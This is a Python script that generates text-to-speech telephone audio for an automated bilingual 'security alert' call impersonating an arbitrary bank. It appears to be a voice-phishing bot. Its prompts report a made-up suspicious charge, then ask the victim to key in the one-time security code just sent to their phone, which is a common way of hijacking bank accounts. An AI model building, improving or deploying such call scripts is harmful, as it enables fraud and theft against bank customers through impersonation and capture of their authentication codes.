from venv import logger
from pydantic import BaseModel
from gtts import gTTS
from pydub import AudioSegment
import os

# Configuration
AUDIO_PATH = "./audios/"

class PersonalData(BaseModel):
    sex: str
    name: str
    bank_name: str
    credit_card: str
    last_code: str
    has_representation: bool = False


# Function to create personalized messages
def create_personalized_message(data: PersonalData, lang: str = "es") -> str:
    saludo = "o" if data.sex == "M" else "a"
    last_code_formatted = f"{data.last_code[:2]} {data.last_code[2:]}"
    
    if lang == "es":
        return f"""
        Estimad{saludo} {data.name}, Esta es una notificación de alerta de seguridad de {data.bank_name}.
        Hemos detectado una transacción internacional sospechosa en su tarjeta {data.credit_card} terminada en {last_code_formatted}. 
        Se realizó un cargo por 1,300 pesos con 50 centavos. 
        Si usted no reconoce o no autorizó este cargo, por favor presione 1 para cancelarlo de inmediato.
        Si necesita escuchar este mensaje nuevamente, presione 2.
        {" Si prefiere hablar con uno de nuestros representantes de servicio al cliente, presione 3." if data.has_representation else ""}
        En caso de que usted sí haya realizado esta transacción, no es necesario que haga nada.
        """
    elif lang == "en":
        return f"""
        Dear {data.name},
        This is a security alert notification from {data.bank_name}.
        We've detected a suspicious international transaction on your card ending in {last_code_formatted}. 
        A charge of 95 dollars and 14 cents has been made.
        If you don’t recognize or didn’t authorize this charge, please press 1 to cancel it immediately.
        If you'd like to hear this message again, press 2.
        {"If you prefer to speak with one of our customer service representatives, press 3." if data.has_representation else ""}
        If you did make this transaction, there’s no need to take any action.
        """


# Function to generate an audio file
def generate_audio(message: str, filename: str, lang: str) -> str:
    tts = gTTS(text=message, lang=lang)
    temp_file = f"{AUDIO_PATH}{filename}.mp3"
    tts.save(temp_file)

    wav_file = f"{AUDIO_PATH}{filename}.wav"
    convert_to_wav(temp_file, wav_file)
    os.remove(temp_file)  # Delete temporary .mp3 file

    return wav_file


# Function to convert audio to 8000 Hz, mono format
def convert_to_wav(input_file: str, output_file: str):
    audio = AudioSegment.from_file(input_file)
    audio = audio.set_frame_rate(8000).set_channels(1)
    audio.export(output_file, format="wav")


# Function to generate static messages in both languages
def generate_static_audios():
    static_messages = {
        "message_select_option": {
            "es": "Por favor, seleccione una opción.",
            "en": "Please select an option."
        },
        "message_code_security": {
            "es": "Para cancelar la transacción, primero debe confirmar su identidad. Le hemos enviado un código de seguridad por mensaje de texto a su teléfono. Después del tono, introduzca únicamente la parte numérica del código recibido, sin interrumpir la llamada.",
            "en": "To cancel the transaction, you must first confirm your identity. We have sent a security code to your phone via text message. After the tone, please enter only the numeric part of the code received, without disconnecting the call."
        },
        "message_invalid_code_security": {
            "es": "El código de seguridad no es válido. Por favor, ingréselo nuevamente después del tono.",
            "en": "The security code is invalid. Please enter it again after the tone."
        },
         "message_wait_validation": {
            "es": "Espere un momento en línea mientras se valida el código de seguridad proporcionado.",
            "en": "Please hold on for a moment while the provided security code is being validated."
        },
        "message_transfer": {
            "es": "Por favor, permanezca en línea; en breve uno de nuestros representantes le atenderá.",
            "en": "Please stay on the line; one of our representatives will be with you shortly."
        }
    }
    
    for filename, messages in static_messages.items():
        for lang, text in messages.items():
            generate_audio(text, f"{filename}_{lang}", lang)
    logger.info("Static audios generated.")


# Main function to create personalized and static audios
def create_personalized_audio(data: PersonalData, lang: str = "es") -> str:
    # Generate static audios if not already done
    # if not os.path.exists(AUDIO_PATH):
    #     os.makedirs(AUDIO_PATH)
    generate_static_audios()

    # Create personalized audio
    message = create_personalized_message(data, lang)
    filename = f"welcome_message_{lang}"
    return generate_audio(message, filename, lang)
